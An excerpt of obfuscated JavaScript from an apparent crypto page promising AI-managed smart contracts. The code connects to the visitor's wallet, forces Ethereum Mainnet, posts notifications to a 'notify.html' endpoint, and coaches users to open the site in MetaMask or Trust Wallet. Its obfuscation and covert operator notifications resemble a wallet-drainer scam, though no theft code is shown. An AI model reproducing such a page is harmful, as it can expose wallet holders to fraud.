...
function sendNotification(_0x8a82fe, _0x30c7ae = '') {
  ...
  _0x265d8f.open('POST', 'notify.html', true)
...
function setHeader() {
  if (header) {
    header.textContent = 'Create Your Smart Contract and Manage with AI'
  }
}
...
const contractABI = [
  ...
  contractBytecode =
    ''
async function initWeb3() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum)
    web3ForBalance = new Web3('https://eth.drpc.org/')
    try {
      const _0x48c989 = await window.ethereum.request({ method: 'eth_chainId' })
      if (_0x48c989 !== '0x1') {
        try {
          ...
          if (_0x16aad2.code === 4902) {
            try {
              ...
              return (
                await typeText(
                  tutorialText,
                  'Failed to add Ethereum Mainnet: ' + _0x46df55.message,
                  10
                ),
                false
              )
            ...
            return (
              await typeText(
                tutorialText,
                'Failed to switch to Ethereum Mainnet: ' + _0x16aad2.message,
                10
              ),
              false
            )
      ...
      return (
        await typeText(
          tutorialText,
          'Web3 initialization error: ' + _0x197896.message,
          10
        ),
        false
      )
    ...
    return (
      _0x50ca8f
        ? await typeText(
            tutorialText,
            'Please open this site in MetaMask or Trust Wallet\'s built-in browser:\n- Install <a href="https://metamask.io/download.html" target="_blank">MetaMask</a> or <a href="https://trustwallet.com/" target="_blank">Trust Wallet</a>.\n- Open the app, go to "Browser" (MetaMask) or "DApps" (Trust Wallet), and enter the site\u2019s URL.',
            10
          )
        : await typeText(
            tutorialText,
